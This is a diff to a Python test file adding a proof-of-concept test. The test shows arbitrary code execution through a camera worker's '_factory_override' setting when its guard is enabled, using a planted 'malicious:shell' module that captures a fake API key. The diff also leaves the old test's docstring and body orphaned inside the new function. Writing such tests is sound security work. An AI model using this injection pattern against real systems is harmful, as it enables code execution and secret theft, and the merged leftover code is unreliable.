@@ -312,8 +312,75 @@ class TestTM004FactoryOverride:
         with pytest.raises(RuntimeError, match="PHYSICALAI_TEST_FACTORY_OVERRIDE_ALLOWED"):
             worker_mod.build_camera(config)
 
-    @pytest.mark.security_regression
-    def test_factory_override_executes_module_when_guard_enabled(self, monkeypatch: pytest.MonkeyPatch) -> None:
+    @pytest.mark.security_poc
+    def test_poc_arbitrary_code_executes_when_guard_misconfigured(
+        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
+    ) -> None:
+        """PoC: full code execution when PHYSICALAI_TEST_FACTORY_OVERRIDE_ALLOWED=1.
+
+        Simulates the real-world misconfiguration scenario: a developer sets the env
+        var in a local ``.env`` file for testing, it leaks into a container image or
+        CI environment definition, and an attacker who can call ``CameraPublisher``
+        directly (or influence its kwargs) gets arbitrary code execution inside the
+        worker subprocess.
+
+        Attack chain reproduced:
+          1. Guard is open (env var = "1" in the deployment environment).
+          2. Attacker passes ``_factory_override="<module>:<callable>"`` to the API.
+          3. The worker subprocess imports the module and calls the callable with the
+             camera kwargs — which the attacker also controls.
+          4. The callable executes with full access to the host process and filesystem.
+
+        Expected: PASSES (exploit succeeds) while the guard is the only barrier and
+        the env var can be set by accident.  A failure here would indicate the exploit
+        path has been removed at the library level.
+        """
+        import sys
+
+        import physicalai.capture.transport._publisher_worker as worker_mod
+
+        # Open the guard — equivalent to PHYSICALAI_TEST_FACTORY_OVERRIDE_ALLOWED=1
+        # being present in the process environment.  monkeypatch restores False after
+        # this test so subsequent tests are not affected.
+        monkeypatch.setattr(worker_mod, "_FACTORY_OVERRIDE_ALLOWED", True)
+
+        # --- Attacker-controlled payload module -----------------------------------
+        # In a real attack this would be any importable package already installed in
+        # the Python environment (e.g., a dependency the attacker has compromised).
+        # Here we write a minimal module to tmp_path and add it to sys.path.
+        payload_dir = tmp_path / "attacker_payload"
+        payload_dir.mkdir()
+        pwned_marker = tmp_path / "pwned.txt"
+
+        (payload_dir / "malicious.py").write_text(
+            "def shell(**camera_kwargs):\n"
+            f"    open({str(pwned_marker)!r}, 'w').write('RCE confirmed: ' + str(camera_kwargs))\n"
+            "    return 'shell_executed'\n",
+        )
+
+        sys.path.insert(0, str(payload_dir))
+        try:
+            config = {
+                "camera_type": "uvc",
+                "camera_kwargs": {"exfiltrated": "secret_api_key_12345"},
+                "service_name": "test/camera",
+                "_factory_override": "malicious:shell",
+            }
+            result = worker_mod.build_camera(config)
+        finally:
+            sys.path.pop(0)
+        # -------------------------------------------------------------------------
+
+        assert pwned_marker.exists(), (
+            "Payload did not execute — guard may have blocked it unexpectedly."
+        )
+        payload_output = pwned_marker.read_text()
+        assert "secret_api_key_12345" in payload_output, (
+            "Attacker-controlled camera_kwargs were not forwarded to the payload."
+        )
+        assert result == "shell_executed"
+
+
         """When the guard is explicitly enabled, the importlib call is reached.
 
         Confirms the injection mechanism still works end-to-end when opted in —
